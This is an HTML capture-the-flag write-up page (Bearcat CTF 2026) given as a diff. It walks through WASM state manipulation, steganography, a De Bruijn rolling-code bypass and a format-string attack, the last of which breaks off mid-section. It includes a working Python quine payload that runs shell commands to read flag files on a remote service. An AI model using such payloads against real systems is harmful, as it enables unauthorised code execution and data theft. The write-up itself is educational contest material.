@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Bearcat CTF 2026 — darivxe</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0a0a;--surface:#111111;--surface-2:#161616;
+  --line:#1f1f1f;--line-2:#2a2a2a;
+  --text:#ededed;--text-dim:#9a9a9a;--text-mute:#6a6a6a;
+  --accent:#bc73b3;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;-webkit-font-smoothing:antialiased;line-height:1.6}
+::selection{background:var(--accent);color:#000}
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:#0a0a0a}
+::-webkit-scrollbar-thumb{background:#1f1f1f}
+::-webkit-scrollbar-thumb:hover{background:#2a2a2a}
+
+@keyframes blink{0%,49%{opacity:1}50%,100%{opacity:0}}
+.blink{animation:blink 1s steps(1) infinite}
+.grid-bg{background-image:linear-gradient(to right,rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(to bottom,rgba(255,255,255,.025) 1px,transparent 1px);background-size:80px 80px}
+
+/* ---- HEADER ---- */
+#site-header{position:fixed;top:0;left:0;right:0;z-index:50;transition:background .3s,border-color .3s;border-bottom:1px solid transparent}
+#site-header.scrolled{background:rgba(10,10,10,.92);backdrop-filter:blur(12px);border-bottom-color:var(--line)}
+.hdr-inner{max-width:1100px;margin:0 auto;padding:0 2rem;height:60px;display:flex;align-items:center;justify-content:space-between}
+.hdr-logo{display:flex;align-items:center;gap:.6rem;text-decoration:none;color:var(--text)}
+.hdr-logo-icon{width:26px;height:26px;border:1px solid var(--line-2);display:flex;align-items:center;justify-content:center;transition:border-color .2s}
+.hdr-logo:hover .hdr-logo-icon{border-color:var(--accent)}
+.hdr-logo-text{font-size:12px;letter-spacing:.07em}
+.hdr-logo-accent{color:var(--accent)}
+.hdr-back{display:flex;align-items:center;gap:.5rem;font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:var(--text-dim);text-decoration:none;border:1px solid var(--line-2);padding:.5rem 1rem;transition:color .2s,border-color .2s,background .2s}
+.hdr-back:hover{color:#000;background:var(--accent);border-color:var(--accent)}
+
+/* ---- MASTHEAD ---- */
+#masthead{position:relative;padding:8rem 0 5rem;border-bottom:1px solid var(--line);overflow:hidden}
+.masthead-inner{position:relative;z-index:2;max-width:1100px;margin:0 auto;padding:0 2rem}
+.eyebrow{display:flex;flex-wrap:wrap;align-items:center;gap:.75rem;font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:var(--text-dim);margin-bottom:2rem}
+.eyebrow-sep{color:var(--line-2)}
+.eyebrow-flag{display:flex;align-items:center;gap:.4rem;color:var(--accent)}
+.masthead-title{font-family:'Space Grotesk',sans-serif;font-weight:700;letter-spacing:-.035em;line-height:.92;font-size:clamp(44px,8vw,100px);margin-bottom:1rem}
+.masthead-subtitle{font-family:'Space Grotesk',sans-serif;font-size:clamp(14px,1.8vw,17px);color:var(--text-dim);margin-bottom:2.5rem;line-height:1.5}
+.masthead-tags{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:2.5rem}
+.tag{padding:.3rem .8rem;border:1px solid var(--line-2);font-size:10px;letter-spacing:.15em;text-transform:uppercase;color:var(--text-dim)}
+.tag-web{border-color:rgba(96,165,250,.4);color:#60a5fa}
+.tag-misc{border-color:rgba(167,139,250,.4);color:#a78bfa}
+.tag-pwn{border-color:rgba(249,115,22,.4);color:#f97316}
+.tag-rev{border-color:rgba(251,191,36,.4);color:#fbbf24}
+.tag-accent{border-color:var(--accent);color:var(--accent)}
+.masthead-meta{display:flex;flex-wrap:wrap;align-items:center;gap:1.5rem;font-size:12px;color:var(--text-mute);padding-top:2rem;border-top:1px solid var(--line)}
+.meta-dot{width:5px;height:5px;border-radius:50%;background:var(--accent);display:inline-block}
+.diff-badge{padding:.2rem .65rem;font-size:10px;letter-spacing:.15em;text-transform:uppercase;border:1px solid #facc15;color:#facc15}
+.masthead-cta{display:flex;flex-wrap:wrap;gap:.75rem;margin-top:2rem}
+.btn-solid{display:inline-flex;align-items:center;gap:.5rem;padding:.75rem 1.25rem;font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.15em;text-transform:uppercase;background:var(--accent);color:#000;border:1px solid var(--accent);text-decoration:none;transition:background .2s,color .2s}
+.btn-solid:hover{background:#000;color:var(--accent)}
+.btn-ghost{display:inline-flex;align-items:center;gap:.5rem;padding:.75rem 1.25rem;font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.15em;text-transform:uppercase;background:transparent;color:var(--text);border:1px solid var(--line-2);text-decoration:none;cursor:pointer;transition:background .2s,color .2s,border-color .2s}
+.btn-ghost:hover{background:var(--accent);color:#000;border-color:var(--accent)}
+.glow{position:absolute;border-radius:50%;pointer-events:none}
+
+/* ---- PAGE BODY ---- */
+.page-body{max-width:1100px;margin:0 auto;padding:4rem 2rem 6rem;display:grid;grid-template-columns:1fr 272px;gap:4rem;align-items:start}
+.content{min-width:0}
+
+/* ---- SIDEBAR ---- */
+.sidebar{position:sticky;top:5rem}
+.toc{border:1px solid var(--line);padding:1.25rem}
+.toc-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1rem;padding-bottom:.75rem;border-bottom:1px solid var(--line)}
+.toc-label{font-size:10px;letter-spacing:.25em;text-transform:uppercase;color:var(--text-mute)}
+.toc-list{list-style:none;display:flex;flex-direction:column}
+.toc-list a{display:flex;align-items:center;gap:.6rem;font-size:11px;color:var(--text-dim);text-decoration:none;padding:.4rem .5rem;border-left:2px solid transparent;transition:color .2s,border-color .2s,background .2s}
+.toc-list a:hover{color:var(--accent);border-left-color:var(--accent)}
+.toc-list a.active{color:var(--accent);border-left-color:var(--accent);background:rgba(198,255,61,.04)}
+.toc-num{color:var(--text-mute);font-size:10px;flex-shrink:0}
+.toc-sub a{padding-left:1.5rem;font-size:10px;color:var(--text-mute)}
+.toc-sub a:hover{color:var(--accent)}
+.toc-sub a.active{color:var(--accent)}
+
+.scard{border:1px solid var(--line);padding:1.25rem;margin-top:1.25rem}
+.scard-title{font-size:10px;letter-spacing:.25em;text-transform:uppercase;color:var(--text-mute);margin-bottom:1rem;padding-bottom:.6rem;border-bottom:1px solid var(--line)}
+.scard-rows{display:flex;flex-direction:column;gap:.65rem}
+.scard-row{display:flex;justify-content:space-between;align-items:center;font-size:12px}
+.scard-key{color:var(--text-mute)}
+.scard-val{color:var(--text)}
+.scard-accent{color:var(--accent)}
+
+/* ---- CONTENT COMPONENTS ---- */
+.wu-section{margin-top:3.5rem;margin-bottom:1.75rem;padding-bottom:.75rem;border-bottom:1px solid var(--line);display:flex;align-items:baseline;gap:.75rem;scroll-margin-top:5rem}
+.wu-section-num{font-size:11px;letter-spacing:.2em;color:var(--text-mute);flex-shrink:0}
+.wu-section-title{font-family:'Space Grotesk',sans-serif;font-size:clamp(22px,3vw,32px);font-weight:700;letter-spacing:-.02em}
+
+.challenge-card{border:1px solid var(--line);margin:2.5rem 0;transition:border-color .25s}
+.challenge-card:hover{border-color:var(--line-2)}
+.cc-header{padding:1rem 1.5rem;background:var(--surface);border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.75rem;scroll-margin-top:5rem}
+.cc-name{font-family:'Space Grotesk',sans-serif;font-size:clamp(17px,2.2vw,22px);font-weight:600;letter-spacing:-.01em}
+.cc-meta{display:flex;align-items:center;gap:.6rem;flex-wrap:wrap}
+.cc-type{font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--text-mute);padding:.2rem .6rem;border:1px solid var(--line-2)}
+.cc-body{padding:1.5rem}
+
+.wu-sub{margin-top:2rem;margin-bottom:.85rem;scroll-margin-top:5rem}
+.wu-sub-title{font-family:'Space Grotesk',sans-serif;font-size:clamp(15px,1.8vw,19px);font-weight:600;color:var(--text)}
+.wu-sub-title::before{content:"// ";color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.85em}
+
+.wu-p{font-family:'Space Grotesk',sans-serif;font-size:15px;color:var(--text-dim);line-height:1.8;margin-bottom:1.1rem}
+.wu-p strong{color:var(--text);font-weight:600}
+.wu-p a{color:var(--accent);text-decoration:none;border-bottom:1px solid transparent;transition:border-color .2s}
+.wu-p a:hover{border-bottom-color:var(--accent)}
+code{font-family:'JetBrains Mono',monospace;font-size:.82em;background:var(--surface);border:1px solid var(--line-2);padding:.1em .4em;color:var(--accent)}
+
+/* Code block */
+.code-block{margin:1.25rem 0;border:1px solid var(--line)}
+.cb-header{display:flex;align-items:center;justify-content:space-between;padding:.55rem 1rem;background:var(--surface);border-bottom:1px solid var(--line)}
+.cb-lang{font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--text-mute)}
+.cb-copy{background:none;border:none;color:var(--text-mute);cursor:pointer;font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.1em;text-transform:uppercase;display:flex;align-items:center;gap:.3rem;padding:.15rem .4rem;transition:color .2s}
+.cb-copy:hover{color:var(--accent)}
+.code-block pre{padding:1.1rem 1rem;overflow-x:auto;margin:0;font-size:12.5px;line-height:1.7;color:var(--text-dim);tab-size:2}
+
+/* Terminal */
+.terminal{margin:1.25rem 0;border:1px solid var(--line-2);background:#0d0d0d}
+.t-bar{padding:.5rem .9rem;background:#151515;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:.4rem}
+.t-dot{width:8px;height:8px;border-radius:50%}
+.terminal pre{padding:1rem;font-size:12px;line-height:1.7;color:var(--text-dim);overflow-x:auto;margin:0}
+.t-p{color:var(--accent)}
+.t-o{color:var(--text-mute)}
+
+/* Flag */
+.flag-box{margin:1.5rem 0;border:1px solid var(--accent);background:rgba(198,255,61,.04);padding:1.1rem 1.4rem}
+.flag-hdr{display:flex;align-items:center;gap:.55rem;margin-bottom:.55rem;font-size:10px;letter-spacing:.25em;text-transform:uppercase;color:var(--accent)}
+.flag-val{font-family:'JetBrains Mono',monospace;font-size:clamp(12px,1.4vw,14px);color:var(--text);word-break:break-all;letter-spacing:.04em}
+
+/* Info / warn */
+.info-box{margin:1.5rem 0;border-left:2px solid var(--accent);background:var(--surface);padding:.9rem 1.1rem}
+.info-label{font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:.4rem}
+.info-box p{font-family:'Space Grotesk',sans-serif;font-size:14px;color:var(--text-dim);line-height:1.65;margin:0}
+.warn-box{margin:1.5rem 0;border-left:2px solid #facc15;background:rgba(250,204,21,.04);padding:.9rem 1.1rem}
+.warn-label{font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:#facc15;margin-bottom:.4rem}
+
+/* Lists */
+.wu-ul{list-style:none;display:flex;flex-direction:column;gap:.45rem;margin:.75rem 0 1.1rem}
+.wu-ul li{display:flex;align-items:flex-start;gap:.65rem;font-family:'Space Grotesk',sans-serif;font-size:14px;color:var(--text-dim);line-height:1.7}
+.wu-ul li::before{content:"→";color:var(--accent);flex-shrink:0;margin-top:1px;font-family:'JetBrains Mono',monospace}
+
+/* Divider */
+.wu-divider{height:1px;background:var(--line);margin:2rem 0}
+
+/* Image */
+.wu-img{margin:1.5rem 0;border:1px solid var(--line)}
+.wu-img img{width:100%;display:block}
+.wu-img figcaption{padding:.5rem 1rem;background:var(--surface);font-size:11px;color:var(--text-mute);letter-spacing:.04em}
+
+/* Footer */
+.writeup-footer{border-top:1px solid var(--line);max-width:1100px;margin:0 auto;padding:2.5rem 2rem 5rem}
+.wf-inner{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.25rem}
+
+/* Responsive */
+@media(max-width:860px){.page-body{grid-template-columns:1fr}.sidebar{display:none}}
+@media(max-width:600px){.hdr-inner,.masthead-inner,.page-body,.writeup-footer{padding-left:1.25rem;padding-right:1.25rem}}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header id="site-header">
+  <div class="hdr-inner">
+    <a class="hdr-logo" href="https://darivxe.xyz">
+      <div class="hdr-logo-icon">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+      </div>
+      <span class="hdr-logo-text">darivxe<span class="hdr-logo-accent">.sh</span></span>
+    </a>
+    <a href="https://darivxe.xyz/#writeups" class="hdr-back">← writeups</a>
+  </div>
+</header>
+
+<!-- MASTHEAD -->
+<section id="masthead">
+  <div class="glow" style="top:-8rem;right:-8rem;width:480px;height:480px;background:radial-gradient(circle,rgba(198,255,61,.09) 0%,transparent 60%)"></div>
+  <div class="grid-bg" style="position:absolute;inset:0;opacity:.6"></div>
+  <div class="masthead-inner">
+    <div class="eyebrow">
+      <span class="eyebrow-flag">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>
+        Jeopardy CTF
+      </span>
+      <span class="eyebrow-sep">|</span>
+      <span>21 Feb 2026</span>
+      <span class="eyebrow-sep">|</span>
+      <span>10 min read</span>
+    </div>
+    <h1 class="masthead-title">Bearcat CTF 2026</h1>
+    <p class="masthead-subtitle">6 challenges solved — Web · Misc · Pwn · Rev</p>
+    <div class="masthead-tags">
+      <span class="tag tag-accent">Jeopardy</span>
+      <span class="tag tag-web">Web</span>
+      <span class="tag tag-misc">Misc</span>
+      <span class="tag tag-pwn">Pwn</span>
+      <span class="tag tag-rev">Rev</span>
+    </div>
+    <div class="masthead-meta">
+      <span style="display:flex;align-items:center;gap:.5rem"><span class="meta-dot"></span> Difficulty: <span class="diff-badge">Medium</span></span>
+      <span style="display:flex;align-items:center;gap:.5rem"><span class="meta-dot blink"></span> darivxe</span>
+    </div>
+    <div class="masthead-cta">
+      <a href="https://ctftime.org" target="_blank" class="btn-solid">view event ↗</a>
+      <a href="https://darivxe.xyz/#writeups" class="btn-ghost">← all writeups</a>
+    </div>
+  </div>
+</section>
+
+<!-- PAGE BODY -->
+<div class="page-body">
+  <article class="content" id="writeup-content">
+
+    <!-- ══════════════════════════════════════════
+         01 · DUBIOUS DOUBLOON
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-doubloon">
+      <span class="wu-section-num">01</span>
+      <h2 class="wu-section-title">Dubious Doubloon</h2>
+    </div>
+
+    <div class="challenge-card" id="c-doubloon">
+      <div class="cc-header">
+        <span class="cc-name">Dubious Doubloon</span>
+        <div class="cc-meta">
+          <span class="tag tag-web">Web</span>
+          <span class="cc-type">WASM Exploitation</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+        <p class="wu-p">The challenge presented a browser-based coin-flip game where achieving a streak of heads was required. However, flips consistently resulted in tails, suggesting the outcome logic wasn't purely probabilistic.</p>
+        <p class="wu-p">Inspecting the frontend revealed that the game logic was backed by a WebAssembly module. The application exposed the following functions:</p>
+        <ul class="wu-ul">
+          <li><code>buy_upgrade()</code></li>
+          <li><code>flip_coin()</code></li>
+          <li><code>get_state()</code></li>
+        </ul>
+        <p class="wu-p">This indicated that the core game state and logic lived client-side inside WASM rather than being enforced server-side.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">WASM Analysis</h3></div>
+        <p class="wu-p">Opening the loaded module showed that the exported functions could be called directly from the browser console. To enumerate them:</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">javascript</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>import("/pkg/unfair_wasm_game.js").then(m => {
+  console.log(Object.getOwnPropertyNames(m));
+});</pre>
+        </div>
+
+        <p class="wu-p">This revealed that the upgrade system and coin flip logic were callable externally. The UI was just a wrapper — the game engine trusted the client.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">State Manipulation</h3></div>
+        <p class="wu-p">Instead of playing normally, the approach was to interact directly with the WASM instance. The module was initialized manually:</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">javascript</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>const mod = await import("/pkg/unfair_wasm_game.js");
+const inst = await mod.default();</pre>
+        </div>
+
+        <p class="wu-p">Once initialized, the internal memory and exported functions became accessible:</p>
+        <ul class="wu-ul">
+          <li>Upgrades could be triggered programmatically</li>
+          <li>Flip results could be read directly from memory</li>
+          <li>State checks could be bypassed</li>
+        </ul>
+        <p class="wu-p">All ship upgrades were maxed to level 5 using the exposed upgrade interface.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Exploit</h3></div>
+        <p class="wu-p">After upgrades were forced to their maximum level, a brute-force interaction loop was used against the WASM coin flip logic.</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">javascript</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>const mod = await import("/pkg/unfair_wasm_game.js");
+const inst = await mod.default();
+
+for (let mode = 0; mode &lt; 500; mode++) {
+  for (let arg = 0; arg &lt; 500; arg++) {
+    try {
+      const res = inst.flip_coin(mode, arg);
+      const mem = new Uint8Array(inst.memory.buffer);
+
+      let text = "";
+      for (let i = 0; i &lt; res[1]; i++) {
+        text += String.fromCharCode(mem[res[0] + i]);
+      }
+
+      if (text.length > 10 && text !== "HEADS" && text !== "TAILS") {
+        console.log("RESULT:", text);
+        throw "FLAG FOUND";
+      }
+    } catch (e) {}
+  }
+}</pre>
+        </div>
+
+        <p class="wu-p">Instead of returning normal outcomes, the WASM memory eventually revealed a hidden string.</p>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{Fl1p&amp;F1sH}</div>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Root Cause</h3></div>
+        <ul class="wu-ul">
+          <li>Storing game state entirely client-side</li>
+          <li>Exposing internal WASM functions publicly</li>
+          <li>No server-side validation of win conditions</li>
+          <li>Allowing direct manipulation via DevTools</li>
+        </ul>
+
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         02 · PNG (POLLY_NEEDS_GROG)
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-png">
+      <span class="wu-section-num">02</span>
+      <h2 class="wu-section-title">PNG (Polly_Needs_Grog)</h2>
+    </div>
+
+    <div class="challenge-card" id="c-png">
+      <div class="cc-header">
+        <span class="cc-name">PNG (Polly_Needs_Grog)</span>
+        <div class="cc-meta">
+          <span class="tag tag-misc">Misc</span>
+          <span class="cc-type">Steganography</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+        <p class="wu-p">The challenge provided a PNG image of the ship's bird behaving strangely, hinting that hidden information might be embedded within the image itself.</p>
+        <p class="wu-p">Initial inspection showed no metadata, embedded files, or readable strings. This suggested the presence of visual steganography rather than file-based hiding.</p>
+
+        <figure class="wu-img">
+          <img src="/images/image.png" alt="Original Polly challenge image" onerror="this.parentElement.style.display='none'"/>
+          <figcaption>Original challenge image</figcaption>
+        </figure>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Channel Analysis</h3></div>
+        <p class="wu-p">The image was analyzed by isolating individual RGB channels to determine whether hidden pixel data existed within a specific color plane.</p>
+        <ul class="wu-ul">
+          <li>Alpha channel — no hidden data</li>
+          <li>Blue channel — empty</li>
+          <li>Green channel — empty</li>
+          <li><strong>Red channel — abnormal intensity distribution observed</strong></li>
+        </ul>
+        <p class="wu-p">Boosting the red channel's intensity exposed hidden visual content that was not visible in the original RGB composite.</p>
+
+        <figure class="wu-img">
+          <img src="/images/red_boost.png" alt="Red channel boosted revealing hidden flag" onerror="this.parentElement.style.display='none'"/>
+          <figcaption>Red channel intensity boosted — hidden flag becomes visible</figcaption>
+        </figure>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{ARRRRRGB_1s_n34T!}</div>
+        </div>
+
+        <p class="wu-p">The flag was embedded directly within the red color channel and became visible only after isolating and amplifying that channel. The image appeared normal when viewed as a full RGB composite, effectively masking the hidden data.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Technique</h3></div>
+        <ul class="wu-ul">
+          <li>RGB channel separation</li>
+          <li>Pixel intensity amplification</li>
+          <li>Visual steganography detection</li>
+        </ul>
+
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         03 · THE BOY IS QUINE
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-quine">
+      <span class="wu-section-num">03</span>
+      <h2 class="wu-section-title">The Boy is Quine</h2>
+    </div>
+
+    <div class="challenge-card" id="c-quine">
+      <div class="cc-header">
+        <span class="cc-name">The Boy is Quine</span>
+        <div class="cc-meta">
+          <span class="tag tag-misc">Misc</span>
+          <span class="cc-type">Code Execution</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+        <p class="wu-p">The challenge exposed a remote service that prompted the user to submit a quine — a program that outputs its own source code when executed.</p>
+
+        <div class="terminal">
+          <div class="t-bar"><span class="t-dot" style="background:#ff5f57"></span><span class="t-dot" style="background:#febc2e"></span><span class="t-dot" style="background:#28c840"></span></div>
+          <pre><span class="t-p">$</span> nc chal.bearcatctf.io 31806
+<span class="t-o">Give me a quine</span></pre>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Analysis</h3></div>
+        <p class="wu-p">The service validated whether the submitted code was a true quine by comparing the input with the program's stdout after execution. If it matched exactly, the input was accepted.</p>
+        <p class="wu-p">Crucially, once accepted, the code was executed again — effectively allowing arbitrary Python execution after passing the quine validation step.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Vulnerability</h3></div>
+        <ul class="wu-ul">
+          <li>User-supplied Python code was executed directly</li>
+          <li>Quine validation acted as the only gate</li>
+          <li>No sandboxing or syscall restriction</li>
+          <li>Code executed again after validation</li>
+        </ul>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Exploit</h3></div>
+        <p class="wu-p">A Python quine was crafted that printed its own source to satisfy validation while embedding a payload to retrieve the flag from common filesystem locations.</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">python</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>a='a=%r;import sys,os,getpass;sys.stdout.write(a%%a);getpass.getuser()!="quine" and os.system("cat flag.txt 2>/dev/null || cat /home/quine/flag.txt 2>/dev/null || cat /home/ctf/flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /challenge/flag 2>/dev/null")';import sys,os,getpass;sys.stdout.write(a%a);getpass.getuser()!="quine" and os.system("cat flag.txt 2>/dev/null || cat /home/quine/flag.txt 2>/dev/null || cat /home/ctf/flag.txt 2>/dev/null || cat /app/flag 2>/dev/null || cat /challenge/flag 2>/dev/null")</pre>
+        </div>
+
+        <p class="wu-p">The quine satisfied the equality check, then executed the embedded command, resulting in remote command execution and flag retrieval.</p>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{1t5_mY_t1m3_t0_sh1n3}</div>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Root Cause</h3></div>
+        <ul class="wu-ul">
+          <li>Execution of untrusted Python input</li>
+          <li>Reliance on quine validation as a security boundary</li>
+          <li>No isolation or sandboxing</li>
+          <li>Direct filesystem command access via Python runtime</li>
+        </ul>
+
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         04 · DA BROWN'S REVENGE
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-debruijn">
+      <span class="wu-section-num">04</span>
+      <h2 class="wu-section-title">Da Brown's Revenge</h2>
+    </div>
+
+    <div class="challenge-card" id="c-debruijn">
+      <div class="cc-header">
+        <span class="cc-name">Da Brown's Revenge</span>
+        <div class="cc-meta">
+          <span class="tag tag-misc">Misc</span>
+          <span class="cc-type">Rolling Code Abuse</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+        <p class="wu-p">The service simulated a rolling-code garage-door style authentication mechanism. Each request required a binary access string, and the system validated whether the correct code appeared within it.</p>
+
+        <div class="terminal">
+          <div class="t-bar"><span class="t-dot" style="background:#ff5f57"></span><span class="t-dot" style="background:#febc2e"></span><span class="t-dot" style="background:#28c840"></span></div>
+          <pre><span class="t-p">$</span> nc chal.bearcatctf.io 19679</pre>
+        </div>
+
+        <p class="wu-p">After each successful submission, the service reported progress toward 20 successful validations before revealing the flag.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Behavior Analysis</h3></div>
+        <p class="wu-p">Observing responses showed that the server was not verifying equality with a generated code, but instead checking whether the correct binary sequence appeared <strong>anywhere inside the submitted input string</strong>.</p>
+        <p class="wu-p">This meant the problem was not predicting the rolling code — it was ensuring the generated value would appear as a substring of the payload.</p>
+
+        <div class="info-box">
+          <div class="info-label">// key insight</div>
+          <p>The challenge reduced to a coverage problem. If the payload contained all possible 12-bit combinations, any generated code would be matched automatically by the server's substring check.</p>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Exploit — De Bruijn Sequence</h3></div>
+        <p class="wu-p">A De Bruijn sequence was generated for binary values of length 12, producing a minimal cyclic string that contains every possible 12-bit pattern exactly once.</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">python</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>import sys
+
+def debruijn(k, n):
+    a = [0]*(k*n)
+    sequence = []
+    def db(t, p):
+        if t > n:
+            if n % p == 0:
+                sequence.extend(a[1:p+1])
+        else:
+            a[t] = a[t-p]
+            db(t+1, p)
+            for j in range(a[t-p]+1, k):
+                a[t] = j
+                db(t+1, t)
+    db(1,1)
+    return ''.join(str(i) for i in sequence)
+
+payload = debruijn(2,12)
+
+for _ in range(25):
+    print(payload)
+    sys.stdout.flush()</pre>
+        </div>
+
+        <p class="wu-p">This payload ensured that every server-generated 12-bit rolling code would appear within the submitted string, allowing consecutive validations to succeed automatically.</p>
+
+        <div class="terminal">
+          <div class="t-bar"><span class="t-dot" style="background:#ff5f57"></span><span class="t-dot" style="background:#febc2e"></span><span class="t-dot" style="background:#28c840"></span></div>
+          <pre><span class="t-o">Correct Access Code, 1 out of 20
+Correct Access Code, 2 out of 20
+...
+Correct Access Code, 20 out of 20</span></pre>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{i_5pelled_de_brujin_wr0ng_7689472}</div>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Root Cause</h3></div>
+        <ul class="wu-ul">
+          <li>Rolling code verified via substring search</li>
+          <li>No requirement for exact match</li>
+          <li>No rate limiting or attempt validation</li>
+          <li>Predictability replaced by coverage exploit</li>
+        </ul>
+
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         05 · TREASURE HUNTER
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-treasure">
+      <span class="wu-section-num">05</span>
+      <h2 class="wu-section-title">Treasure Hunter</h2>
+    </div>
+
+    <div class="challenge-card" id="c-treasure">
+      <div class="cc-header">
+        <span class="cc-name">Treasure Hunter</span>
+        <div class="cc-meta">
+          <span class="tag tag-pwn">Pwn</span>
+          <span class="cc-type">Format String → Canary → ROP</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+
+        <div class="terminal">
+          <div class="t-bar"><span class="t-dot" style="background:#ff5f57"></span><span class="t-dot" style="background:#febc2e"></span><span class="t-dot" style="background:#28c840"></span></div>
+          <pre><span class="t-p">$</span> nc chal.bearcatctf.io 28799
+<span class="t-o">Welcome pirate!
+But first what is your name pirate?</span></pre>
+        </div>
+
+        <p class="wu-p">The name input was directly reflected back without sanitization, indicating a potential format string vulnerability.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Stage 1 — Canary Leak</h3></div>
+        <p class="wu-p">Supplying a format string such as <code>%13$p</code> revealed stack values. This allowed extraction of the stack canary required to bypass stack protection.</p>
+
+        <div class="code-block">
